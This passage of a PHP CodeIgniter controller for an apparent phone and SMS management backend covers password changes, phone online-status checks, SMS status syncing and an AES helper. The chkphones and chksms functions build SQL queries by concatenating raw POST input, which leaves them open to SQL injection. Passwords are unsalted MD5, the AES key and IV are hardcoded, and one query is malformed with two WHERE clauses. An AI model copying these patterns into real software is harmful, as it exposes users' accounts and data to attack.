                'id' => 'admin'
            ))->row()->password;
           
            if ($current_password == MD5($data['password']) && $data['new_password'] == $data['confirm_new_password']) {
                $this->db->where('id', 'admin');
                $this->db->update('admin', array(
                    'password' => MD5($data['new_password'])                    
                ));
                $page_data['retalert']  = 'Password Updated';
                $this->session->set_flashdata('flash_message', "Password Updated");
            } else {
                $this->session->set_flashdata('flash_message', "Password Mismatch");
                $page_data['retalert']  = 'Password Mismatch';
            }
            //redirect(base_url() . 'index.php?phone/manage_profile/', 'refresh');
        }

        
        $page_data['page_name']  = 'manage_profile';
        $page_data['page_title'] = "Manage Profile";
        $page_data['edit_data']  = $this->db->get_where('admin', array(            
            'admin_id' => $this->session->userdata('admin_id')
        ))->result_array();
        
        $this->load->view('backend/index', $page_data);
    }

    function count(){
        $page_data['page_name']  = 'count';
        $page_data['page_title'] = "mange count";
       
        
        $this->load->view('backend/index', $page_data);
    }
    function chkphones(){
        
        $phones = $this->input->post('phones');
        $phonelist = $this->input->post('phonelist');
        $phonelist = json_decode($phonelist);

        $sql = 'select count(*) as phonecount from phone where status != 99';
        $phonecunt = $this->db->query($sql)->row()->phonecount;
        if($phones != $phonecunt){
            echo 'load';
            return;
        }


        foreach ($phonelist as $phone) {
            $phonenum = $phone->phone;
            $state = $phone->state;

            $sql = 'select * from phone where number="'.$phonenum.'" where status != 99';
            $result = $this->db->query($sql);
            $result = $result->result_array();

            $dt = new DateTime("now", new DateTimeZone('Asia/Tokyo'));        
            $date =  $dt->format('Y-m-d, H:i');
            $adate = date('Y-m-d H:i', strtotime($date. '-10 minutes'));

            if(count($result) > 0){

                $phonedata = $result[0];
                
                if($phonedata['connected'] < $adate){//offline
                    if($state != 'offline'){
                        echo 'load';
                        return;
                    }
                }else{//online
                    if($state != 'online'){
                        echo 'load';
                        return;
                    }
                }
            }else{
                echo 'load';
                return;
             }
        }
        return;

    }

    function chksms(){        

        // $dt = new DateTime("now", new DateTimeZone('Asia/Tokyo'));        
        // $cdate =  $dt->format('Y-m-d H:i');
        // $adate = date('Y-m-d H:i', strtotime($cdate. '-2 minutes'));

        // $sql = "select * from sendsms where end < '".$adate."' and status = 2";        
        // $query = $this->db->query($sql);
        // $isupdated = false;
        // foreach ($query->result() as $row){
        //     $isupdated = true;
        //     $fromnumber = $row->fromnumber;
        //     $sendid = $row->send_id;
        //     $count = $row->count;
        //     $success = $row->success;
        //     $failed = $count - $success;

        //     $data = array(
        //         'failed'    => $failed,
        //         'status'    => 1,                
        //     );
            
        //     $this->db->where('send_id', $sendid);
        //     $this->db->update('sendsms', $data);

        //     $sql = "update presendsms set count=count+".$success.", precount=0 where number='".$fromnumber."'";
        //     $this->db->query($sql);
            

        //     //var_dump($fromnumber);    
        // }

        // if($isupdated){
        //     echo 'load';
        //     return;
        // }


        $smslist = $this->input->post('smslist');
        $smslist = json_decode($smslist);
        
        foreach ($smslist as $sms) {
            $sendid = $sms->sendid;
            $status = $sms->status;
            $success = $sms->success;
            $failed = $sms->failed;
            $start = $sms->start;
            $end = $sms->end;

            $sql = 'select status, success, failed, start, end from sendsms where send_id="'.$sendid.'"';
            $rstatus = $this->db->query($sql)->row()->status;
            $rsuccess = $this->db->query($sql)->row()->success;
            $rfailed = $this->db->query($sql)->row()->failed;
            $rstart = $this->db->query($sql)->row()->start;
            $rend = $this->db->query($sql)->row()->end;
            if($rstatus != $status || $rsuccess != $success || $rfailed != $failed || $rstart != $start || $rend != $end){
                echo 'load';
                return;
            }

        }

        return;

    }

    function encrypt_decrypt($action, $string) {
        $output = false;
    
        $encrypt_method = "AES-128-CBC";
        $secret_key = '9876543210fedcba';
        $secret_iv = '0123456789abcdef';
    
        // hash
        if (strlen($secret_key) < 16) {
            $key = str_pad("$secret_key", 16, "0"); //0 pad to len 16
        } else if (strlen($secret_key) > 16) {
            $key = substr($secret_key, 0, 16); //truncate to 16 bytes
        }else{
            $key = $secret_key;
        }
        //$key = hash('sha128', $secret_key);
        
        // iv - encrypt method AES-256-CBC expects 16 bytes - else you will get a warning
        //$iv = substr(hash('sha128', $secret_iv), 0, 16);
    
        if ( $action == 'encrypt' ) {
            $output = openssl_encrypt($string, $encrypt_method, $key, OPENSSL_RAW_DATA , $secret_iv);
            $output = base64_encode($output);
        } else if( $action == 'decrypt' ) {
            $output = openssl_decrypt(base64_decode($string), $encrypt_method, $key, OPENSSL_RAW_DATA , $secret_iv);
        }
    
        return $output;
    }
}
